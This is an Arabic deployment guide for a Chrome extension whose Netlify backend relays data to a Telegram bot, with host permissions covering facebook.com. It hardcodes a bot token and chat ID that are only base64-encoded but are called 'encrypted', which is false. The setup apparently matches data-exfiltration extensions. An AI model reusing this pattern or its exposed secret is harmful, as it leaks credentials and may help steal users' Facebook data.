# 🚀 دليل نشر النظام - Backend (Netlify) + Frontend (Extension)

## 📋 نظرة عامة

النظام مقسم إلى قسمين:
- **Backend**: يعمل على Netlify Functions (Serverless)
- **Frontend**: إضافة متصفح (Chrome Extension)

## 🛠️ إعداد Backend (Netlify)

### 1. إنشاء حساب Netlify
```bash
# تثبيت Netlify CLI
npm install -g netlify-cli

# تسجيل الدخول
netlify login
```

### 2. إعداد المشروع
```bash
# الانتقال إلى مجلد Backend
cd backend

# تثبيت التبعيات
npm install

# تشغيل محلي للتطوير
npm run dev
```

### 3. إعداد متغيرات البيئة
أنشئ ملف `.env` في مجلد `backend`:
```env
ENCRYPTION_KEY=your-super-secret-key-here
NODE_ENV=production
```

### 4. نشر على Netlify
```bash
# إنشاء موقع جديد
netlify sites:create --name your-telegram-api

# ربط المشروع بـ Git (اختياري)
netlify link

# النشر
npm run deploy
```

### 5. إعداد متغيرات البيئة في Netlify
1. اذهب إلى لوحة تحكم Netlify
2. اختر موقعك
3. اذهب إلى Site settings > Environment variables
4. أضف:
   - `ENCRYPTION_KEY`: مفتاح التشفير الخاص بك

### 6. الحصول على URL
بعد النشر، ستحصل على URL مثل:
```
https://your-telegram-api.netlify.app
```

## 🔧 إعداد Frontend (Extension)

### 1. تحديث URL في الإضافة
في ملف `frontend/extension/background.js`:
```javascript
// تغيير هذا السطر
const NETLIFY_API_URL = 'https://your-netlify-site.netlify.app/.netlify/functions/telegram-api';
```

### 2. تحديث manifest.json
في ملف `frontend/extension/manifest.json`:
```json
"host_permissions": [
  "https://your-netlify-site.netlify.app/*",
  "https://api.telegram.org/*",
  "https://*.facebook.com/*"
]
```

### 3. تثبيت الإضافة
1. افتح Chrome
2. اذهب إلى `chrome://extensions/`
3. فعّل "Developer mode"
4. اضغط "Load unpacked"
5. اختر مجلد `frontend/extension`

## 🔐 إعدادات الأمان

### 1. تشفير التوكن والـ ID
في ملف `backend/netlify-functions/telegram-api.js`:
```javascript
// تشفير التوكن والـ ID
const ENCRYPTED_BOT_TOKEN = 'ODA0MTE5NDA4NDpBQUhVQ1ZiajRRR0YybUM5Y3dvQjQzbElFN05wOVMzRVVIOA==';
const ENCRYPTED_CHAT_ID = 'NjY0MTkzODM1';
```

### 2. مفتاح التشفير
```javascript
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'your-secret-key-here';
```

## 🧪 اختبار النظام

### 1. اختبار Backend
```bash
# اختبار محلي
curl -X POST http://localhost:8888/.netlify/functions/telegram-api \
  -H "Content-Type: application/json" \
  -d '{"test": "data"}'
```

### 2. اختبار Frontend
1. افتح وحدة تحكم المتصفح (F12)
2. اكتب:
```javascript
// اختبار الاتصال
chrome.runtime.sendMessage({
  action: 'testTelegram'
});
```

### 3. مراقبة السجلات
في Netlify:
1. اذهب إلى Functions tab
2. راجع سجلات الدوال
3. تحقق من الأخطاء

## 📊 مراقبة الأداء

### 1. إحصائيات Netlify
```bash
# الحصول على إحصائيات الموقع
netlify status

# مراقبة الدوال
netlify functions:list
```

### 2. مراقبة الاستخدام
في لوحة تحكم Netlify:
- Functions > Invocations
- Analytics > Page views
- Functions > Logs

## 🔄 التحديثات

### 1. تحديث Backend
```bash
cd backend
git pull origin main
npm run deploy
```

### 2. تحديث Frontend
1. حدث الملفات في `frontend/extension/`
2. اذهب إلى `chrome://extensions/`
3. اضغط "Reload" على الإضافة

## 🚨 استكشاف الأخطاء

### مشكلة: Backend لا يستجيب
```bash
# تحقق من حالة الموقع
netlify status

# راجع السجلات
netlify functions:logs
```

### مشكلة: Frontend لا يتصل بـ Backend
1. تحقق من URL في `background.js`
2. تأكد من CORS settings
3. راجع console للخطأ

### مشكلة: التوكن لا يعمل
1. تحقق من تشفير التوكن
2. تأكد من صحة التوكن
3. راجع متغيرات البيئة

## 📁 هيكل الملفات

```
project/
├── backend/
│   ├── netlify-functions/
│   │   └── telegram-api.js
│   ├── netlify.toml
│   └── package.json
├── frontend/
│   └── extension/
│       ├── background.js
│       ├── manifest.json
│       ├── popup.html
│       ├── popup.js
│       └── icons/
└── DEPLOYMENT_GUIDE.md
```

## 🎯 النتيجة النهائية

### ✅ Backend (Netlify):
- Serverless Functions
- حماية متقدمة
- مراقبة تلقائية
- قابل للتوسع

### ✅ Frontend (Extension):
- متصل بـ Netlify API
- حماية محلية
- نظام احتياطي
- سهولة الاستخدام

## 📞 الدعم

إذا واجهت أي مشاكل:

1. راجع سجلات Netlify
2. تحقق من console المتصفح
3. تأكد من إعدادات CORS
4. راجع متغيرات البيئة

---

**ملاحظة**: تأكد من تغيير جميع URLs وملفات الإعدادات قبل النشر. 